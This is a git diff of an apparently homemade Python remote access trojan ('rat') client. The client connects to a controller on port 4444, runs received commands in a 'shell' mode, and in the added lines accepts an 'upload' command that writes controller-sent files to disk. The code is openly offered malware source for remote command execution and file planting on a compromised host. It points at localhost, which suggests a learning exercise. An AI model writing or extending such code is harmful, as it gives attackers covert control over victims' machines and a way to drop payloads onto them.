@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import socket, subprocess, os, platform
+import time
 
 
 class CLIENT:
@@ -18,8 +19,8 @@ class CLIENT:
         
     def main_loop(self):
         while True:
-            command = sock.recv(1024).decode()
-            
+        
+            command = sock.recv(1024).decode()   
                 
             if command == 'shell':
                 while True:
@@ -38,6 +39,19 @@ class CLIENT:
                     except:
                         err = 'bad command'
                         sock.send(err.encode())
+                        
+            if command == "upload":
+                filename = sock.recv(1024).decode()
+                parsed_fn = filename.split('.')
+                file = open(f"{parsed_fn[0]}" + '.' + f"{parsed_fn[1]}",'wb') #open in binary       
+                #         # receive data and write it to file
+                time.sleep(1)
+                l = sock.recv(1024)
+                print(l)
+                file.write(l)
+                file.close()
+
+                
 rat = CLIENT('127.0.0.1', 4444)
 
 if __name__ == '__main__':
